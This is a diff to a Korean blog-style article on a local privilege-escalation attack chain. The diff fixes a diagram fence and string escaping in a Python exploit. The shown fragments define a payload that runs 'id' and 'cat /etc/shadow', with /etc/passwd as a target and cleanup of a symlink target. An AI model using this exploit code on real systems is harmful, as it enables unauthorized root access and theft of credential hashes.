@@ -21,7 +21,7 @@ author: "Intelligence Agent"
 
 아래 다이어그램은 이러한 공격 체인이 어떻게 구성되는지를 단순화하여 보여줍니다.
 
-```javascript
+```mermaid
 graph TD
     A[일반 사용자 권한 획득] --> B[취약점 트리거 시도]
     B --> C[권한 검증 로직 Check]
@@ -64,9 +64,7 @@ import time
 import subprocess
 
 # 악의적인 스크립트 경로 (Root 권한으로 실행되길 원하는 내용)
-EVIL_SCRIPT_CONTENT = "#!/bin/bash
-id
-cat /etc/shadow"
+EVIL_SCRIPT_CONTENT = "#!/bin/bash\nid\ncat /etc/shadow"
 EVIL_FILE = "/tmp/evil_payload.sh"
 TARGET_FILE = "/etc/passwd" # 덮어쓰거나 읽고 싶은 시스템 중요 파일
 SAFE_FILE = "/tmp/safe_dummy.txt"
@@ -111,8 +109,7 @@ try:
             break
             
 except KeyboardInterrupt:
-    print("
-[*] Exploit stopped.")
+    print("\n[*] Exploit stopped.")
     # 정리
     if os.path.exists("/tmp/link_target"):
         os.remove("/tmp/link_target")
